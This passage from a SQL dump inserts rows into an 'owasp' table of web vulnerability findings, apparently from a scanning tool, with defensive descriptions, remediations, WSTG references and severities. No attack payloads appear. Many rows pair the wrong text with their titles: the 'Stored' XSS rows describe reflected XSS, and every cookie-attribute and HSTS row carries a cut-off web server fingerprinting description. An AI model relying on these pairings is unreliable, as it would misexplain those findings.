(60, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 67, 'High');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(61, 'Missing HttpOnly Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 67, 'Low'),
(62, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 67, 'Low'),
(63, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 68, 'High'),
(64, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 68, 'High'),
(65, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 68, 'Low'),
(66, 'Missing Expires Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 68, 'Low'),
(67, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 68, 'Low'),
(68, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 68, 'Low'),
(71, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 85, 'High'),
(72, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 85, 'Medium'),
(73, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 88, 'Low'),
(74, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 88, 'Medium'),
(75, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 89, 'Medium'),
(76, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 89, 'Low'),
(77, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 94, 'Medium'),
(78, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 94, 'Low'),
(79, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 94, 'Low'),
(80, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 94, 'Low'),
(81, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 94, 'Low'),
(82, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 95, 'Medium'),
(83, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 95, 'Low'),
(84, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 95, 'Low'),
(85, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 95, 'Low'),
(86, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 95, 'Low'),
(87, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 96, 'Medium'),
(88, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 96, 'Low'),
(89, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 96, 'Low'),
(90, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 96, 'Low'),
(91, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 96, 'Low'),
(92, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 97, 'Medium'),
(93, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 97, 'Low'),
(94, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 97, 'Low'),
(95, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 97, 'Low'),
(96, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 97, 'Low'),
(97, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 98, 'High'),
(98, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 98, 'High'),
(99, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 98, 'Medium'),
(100, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 98, 'Low'),
(101, 'Missing Expires Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 98, 'Low'),
(102, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 98, 'Low'),
(103, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 98, 'Low'),
(104, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 105, 'High'),
(105, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 105, 'Medium'),
